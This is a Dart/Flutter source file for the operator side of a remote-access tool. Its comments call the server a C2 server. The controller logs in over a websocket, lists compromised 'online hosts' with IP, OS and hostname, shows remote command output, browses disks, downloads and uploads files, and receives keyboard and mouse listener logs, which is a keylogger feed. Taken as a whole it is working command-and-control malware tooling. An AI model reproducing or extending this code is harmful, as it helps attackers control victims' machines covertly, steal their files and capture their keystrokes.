import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:flutter/cupertino.dart';
import 'package:get/get.dart';
import 'package:path_provider/path_provider.dart';
import 'package:remote_control_ui/common/const/base_const_args.dart';
import 'package:remote_control_ui/common/const/type_action_const.dart';
import 'package:remote_control_ui/common/controller/cmd_exec_controller.dart';
import 'package:remote_control_ui/common/controller/listener_controller.dart';
import 'package:remote_control_ui/common/controller/source_manage_controller.dart';
import 'package:remote_control_ui/common/model/command_model.dart';
import 'package:remote_control_ui/common/model/message_model.dart';
import 'package:remote_control_ui/common/model/online.dart';
import 'package:remote_control_ui/common/model/source/disk_item.dart';
import 'package:web_socket_channel/io.dart';

class SocketController extends GetxController {
  // 连接C2服务器的用户名和密码以及服务器地址
  TextEditingController username = TextEditingController();
  TextEditingController password = TextEditingController();
  TextEditingController server = TextEditingController();
  // 消息发送
  TextEditingController message = TextEditingController();

  // 切换登录/消息按钮
  var connect = false;

  // websocket连接
  late IOWebSocketChannel channel;

  // 消息列表
  List<MessageModel> messageList = [];

  // 在线主机列表
  List<Online> onlineList = [];

  // 选定目标
  String target = "";

  // 传输状态 0：无动作，1：下载文件，2：图片传输
  int transStatus = 0;

  // temp list
  String base64Data = "";

  // 尝试连接
  tryConnect() {
    String connectUrl =
        'ws://${server.text}/remoteController/${username.text}/${password.text}';
    channel = IOWebSocketChannel.connect(Uri.parse(connectUrl));
    // TODO: 检查连接是否失败
    channel.stream.listen((json) {
      handlerJson(json);
    });
  }

  // 初始化加载
  void initMessage() {
    // 登录成功后移动端跳转选择页面，pc直接进入控制页面
    if(BaseConstArgs().isMobile){
      connect = true;
    }else{
      Get.toNamed("/desktopMenuPage");
    }
    update();
  }

  // 更新消息列表
  void updateMessage(MessageModel messageModel) {
    messageList.add(messageModel);
    update();
  }

  send(String json) {
    channel.sink.add(json);
  }

  // 发送的消息
  sendMessage() {
    // channel.sink.add(message);
    MessageModel messageModel = MessageModel(
        username: username.text,
        content: message.text,
        sendTime: DateTime.now().toString());
    String messageJson = messageModel.toJson();
    // 指令类型
    CommandModel commandModel = CommandModel(
        '*',
        username.text,
        TypeActionConst().map['sendMessage']!.type,
        TypeActionConst().map['sendMessage']!.action,
        messageJson);
    channel.sink.add(commandModel.toJson());
    message.text = "";
  }

  // 处理接受到的数据
  void handlerJson(String jsonString) {
    if(jsonString.startsWith("{")){
      CommandModel commandModel = CommandModel.fromJson(jsonString);
      switch (commandModel.c_type) {
        case 0:
          noticeHandler(jsonString);
          break;
      // 消息相关
        case 1:
          messageHandler(jsonString);
          break;
      // 资源管理
        case 2:
          sourceHandler(jsonString);
          break;
        case 3:
          deviceHandler(jsonString);
          break;
      // 查询在线主机结果
        case 100:
          queryHandler(jsonString);
          break;
        default:
          break;
      }
    }else{
      base64Data += jsonString;
      print(base64Data.length);
    }
  }

  // 消息处理
  void messageHandler(jsonString) {
    CommandModel commandModel = CommandModel.fromJson(jsonString);
    // print('cmd result ==> ${commandModel.data}');
    switch (commandModel.action) {
      case 0:
        Get.find<CommandExecutionController>()
            .updateExecutionResult(commandModel.data);
        break;
      case 1:
        Map<String, dynamic> map = json.decode(commandModel.data);
        MessageModel messageModel = MessageModel.fromJson(map);
        updateMessage(messageModel);
        break;
      default:
        break;
    }
  }

  /**
   * @param jsonString 数据模型
   * 1：连接到c2服务器成功
   * 2：操作失败的提示
   * 3：上线提示
   * 4：下线提示
   */
  void noticeHandler(jsonString) {
    CommandModel commandModel = CommandModel.fromJson(jsonString);

    switch(commandModel.action) {
      case 1:
        Get.snackbar('成功提示', '成功连接到服务器！', duration: const Duration(seconds: 3));
        initMessage();
        queryOnline();
        // Get.to("/menuPage");
        break;
      case 2:
        Get.snackbar('操作失败通知', commandModel.data,
            duration: const Duration(seconds: 3));
        break;
      case 3:
        bool contain = false;
        Map fields = json.decode(commandModel.data);
        Online online = Online(fields['ip'], fields['os'], fields['cpu_core'], fields['hostname']);
        Get.snackbar('主机上线提示', online.ip);
        for (var current in onlineList) {
          if(current.ip == online.ip){
            contain = true;
          }
        }
        if(!contain){
          onlineList.add(online);
          update();
        }
        break;
      case 4:
        // print('主机下线：${commandModel.data}');
        Get.snackbar('主机下线提示', commandModel.data);
        // 下线主机是当前正在操作的主机，直接返回上一级
        // print('equles ==> ${commandModel.data == target}');
        if(commandModel.data == target){
          Get.offAllNamed('/nav');
        }
        for(int i = 0; i < onlineList.length; i++){
          if(onlineList[i].ip == commandModel.data){
            onlineList.removeAt(i);
            update();
          }
        }
        break;
      case 5:
        print('trans over');
        if(transStatus == 2){
          Get.find<ListenerController>().bytes = base64Decode(base64Data);
          Get.find<ListenerController>().update();
        }
        if(transStatus == 1){
          Get.find<SourceManageController>().saveFile(base64Data);
        }
        transStatus = 0;
        base64Data = '';
        break;
      default:
        Get.snackbar('失败提示', '与服务器建立连接失败，请检查密码！',
            duration: const Duration(seconds: 3));
        break;
    }
  }

  // 查询在线主机
  void queryOnline() {
    CommandModel commandModel = CommandModel(
        '*',
        username.text,
        TypeActionConst().map['queryOnline']!.type,
        TypeActionConst().map['queryOnline']!.action,
        '""');
    channel.sink.add(commandModel.toJson());
  }

  // 对查询列表结果进行处理
  void queryHandler(jsonString) {
    CommandModel commandModel = CommandModel.fromJson(jsonString);
    List onlines = json.decode(commandModel.data);
    onlineList = onlines.map((e) => Online(e['ip'], e['os'], e['cpu_core'], e['hostname'])).toList();
    update();
  }

  // 资源管理
  void sourceHandler(jsonString) {
    CommandModel commandModel = CommandModel.fromJson(jsonString);
    switch (commandModel.action) {
      case 0 :
        Get.find<SourceManageController>().updateDisk(commandModel);
        break;
      case 1:
        Get.find<SourceManageController>().updateDir(jsonString);
        break;
      case 2:
        Get.defaultDialog(
            title: '文件内容',
            content: Expanded(
              child: SingleChildScrollView(
                child: Text(commandModel.data),
              ),
            ));
        break;
      // case 3:
      //   print('file down over');
      //   break;
      case 4:
        Get.snackbar('操作提示', '上传文件成功！');
        break;
      case 5:
        Get.snackbar('操作提示', commandModel.data);
        Get.find<SourceManageController>().flush();
        break;
      default:
        print('无法识别的资源操作');
        break;
    }
  }

  // 设备操作后的返回
  void deviceHandler(jsonString) {
    CommandModel commandModel = CommandModel.fromJson(jsonString);
    // 是键盘/鼠标监听
    if (commandModel.action == 1 || commandModel.action == 2) {
      Get.find<ListenerController>().addLogger(commandModel);
    }
  }

  closeConnect(String target) {
    CommandModel commandModel = CommandModel(
        Get.find<SocketController>().target,
        Get.find<SocketController>().username.text,
        1,
        2,
        target
    );
    String json = commandModel.toJson();
    // print(json);
    Get.find<SocketController>().send(json);
  }
}